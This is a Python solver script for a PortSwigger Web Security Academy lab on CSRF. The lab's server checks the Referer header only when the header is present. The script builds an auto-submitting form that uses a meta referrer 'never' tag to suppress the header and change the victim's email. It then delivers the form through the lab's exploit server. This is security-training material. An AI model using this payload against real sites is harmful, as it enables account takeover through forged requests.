#!/usr/bin/env python3
"""
CSRF where Referer validation depends on header being present
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 11-referer-validation-header-present.md

What this does:
    The server rejects a wrong Referer domain but, like the earlier
    "token present" lab, only checks the Referer when it finds one to
    compare -- an absent header takes the same free pass an absent token did.
    craft_csrf_payload()'s Referer-suppression strategy adds
    <meta name="referrer" content="never"> ahead of the usual auto-submit
    form, which makes the browser omit the Referer header entirely on the
    form submission. Note this uses content="never", the value verified
    working against this lab and recorded in CSRF.txt -- PortSwigger's own
    published solution uses the newer "no-referrer" keyword instead; both
    suppress the header the same way.

Usage:
    python 11-referer-validation-header-present.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    endpoint = f"{lab_url}/my-account/change-email"
    html = (
        '<html>\n'
        '<head><meta name="referrer" content="never"></head>\n'
        '<body>\n'
        f'<form action="{endpoint}" method="POST">\n'
        '  <input type="hidden" name="email" value="hacker@evil-user.net" />\n'
        '</form>\n'
        '<script>document.forms[0].submit();</script>\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print("[*] Technique: Referer suppressed via <meta referrer=never>")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- the suppressed Referer skipped validation entirely.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
